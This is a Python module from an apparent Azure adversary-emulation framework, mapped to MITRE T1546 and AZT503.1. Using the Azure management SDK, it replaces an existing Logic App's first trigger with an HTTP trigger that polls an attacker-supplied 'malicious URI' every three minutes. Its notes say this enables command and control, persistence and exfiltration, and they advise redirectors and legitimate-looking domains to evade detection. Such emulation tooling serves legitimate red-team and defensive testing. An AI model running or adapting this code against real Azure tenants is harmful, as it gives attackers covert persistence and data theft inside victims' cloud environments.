from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique, TechniqueNote, TechniqueReference
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.mgmt.logic import LogicManagementClient
from core.azure.azure_access import AzureAccess

@TechniqueRegistry.register
class AzureModifyLogicAppTrigger(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1546",
                technique_name="Event Triggered Execution",
                tactics=["Privilege Escalation", "Persistence"],
                sub_technique_name=None
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT503.1",
                technique_name="HTTP Trigger",
                tactics=["Persistence"],
                sub_technique_name="Logic Application"
            )
        ]

        notes = [
            TechniqueNote("This technique requires existing Logic App write permissions"),
            TechniqueNote("For attacker controlled HTTP endpoints, avoid using obvious malicious domains"),
            TechniqueNote("Consider using a redirector or legitimate-looking domain to avoid detection"),
            TechniqueNote("The technique modifies existing Logic Apps to avoid creating new suspicious resources")
        ]
        super().__init__(
            "Modify Logic App Trigger", 
            "Modifies an existing Logic App by replacing its trigger configuration with a HTTP request trigger pointing to an attacker-controlled endpoint. This technique can be used to establish command and control, exfiltrate data, or create persistence mechanisms by leveraging legitimate Logic App workflows. The technique targets existing Logic Apps to avoid creating new suspicious resources and leverages the trusted status of Logic Apps within the environment to bypass security controls. By modifying the trigger to a HTTP trigger, attackers can remotely initiate the Logic App workflow to execute actions with the Logic App's permissions, potentially allowing lateral movement, privilege escalation, or data exfiltration.", 
            mitre_techniques, 
            azure_trm_technique,
            notes=notes
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            resource_group_name: str = kwargs["resource_group_name"]
            logic_app_name: str = kwargs["logic_app_name"]
            new_trigger_uri: str = kwargs["new_trigger_uri"]
            
            # Input validation
            if resource_group_name in ["", None]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required": "Resource Group Name"}
                }
            
            if logic_app_name in ["", None]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required": "Logic App Name"}
                }
            
            if new_trigger_uri in ["", None]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required": "Malicious URI"}
                }
            
            # Validate URI format
            if not (new_trigger_uri.startswith("http://") or new_trigger_uri.startswith("https://")):
                new_trigger_uri = "https://" + new_trigger_uri

            # Get credential and subscription info
            credential = AzureAccess.get_azure_auth_credential()
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")
            
            # Create LogicManagementClient
            logic_client = LogicManagementClient(credential, subscription_id)
            
            # Get the current Logic App workflow
            workflow = logic_client.workflows.get(resource_group_name, logic_app_name)
            
            # Get the current workflow definition & location
            definition = workflow.definition
            location = workflow.location
            
            # Store the original trigger type for reporting
            original_trigger_type = "Unknown"
            if "triggers" in definition:
                for trigger_name, trigger_config in definition["triggers"].items():
                    if "type" in trigger_config:
                        original_trigger_type = trigger_config["type"]
                        break
            
            # Create a new HTTP request trigger
            http_trigger = {
                "type": "Http",
                "inputs": {
                    "uri": new_trigger_uri,
                    "method": "GET"
                },
                "recurrence": {
                    "interval": 3,
                    "frequency": "Minute"
                }
            }
            
            # Modify the workflow definition
            # Replace the first trigger with new HTTP trigger
            if "triggers" in definition:
                first_trigger_name = list(definition["triggers"].keys())[0]
                definition["triggers"] = {first_trigger_name: http_trigger}
            
            # Update the workflow with the modified definition
            # Not documented but location is required
            workflow_params = {
                "properties": {
                    "definition": definition
                },
                "location": location
            }
            
            update_result = logic_client.workflows.create_or_update(
                resource_group_name,
                logic_app_name,
                workflow_params
            )
            
            # Verify the update was successful
            if update_result:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully modified Logic App '{logic_app_name}' trigger to HTTP trigger with URI",
                    "value": {
                        "result": "Successfully Modified Trigger",
                        "value": {
                        "logic_app_name": logic_app_name,
                        "resource_group": resource_group_name,
                        "original_trigger_type": original_trigger_type,
                        "new_trigger_type": "HTTP",
                        "trigger_uri": new_trigger_uri   
                        }
                    }
                }
            else:
                return ExecutionStatus.FAILURE, {
                    "error": "Failed to update Logic App workflow",
                    "message": "The request succeeded but no workflow was returned"
                }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to modify Logic App trigger"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "resource_group_name": {"type": "str", "required": True, "default": None, "name": "Resource Group Name", "input_field_type": "text"},
            "logic_app_name": {"type": "str", "required": True, "default": None, "name": "Logic App Name", "input_field_type": "text"},
            "new_trigger_uri": {"type": "str", "required": True, "default": None, "name": "Trigger Endpoint URI", "input_field_type": "text"}
        }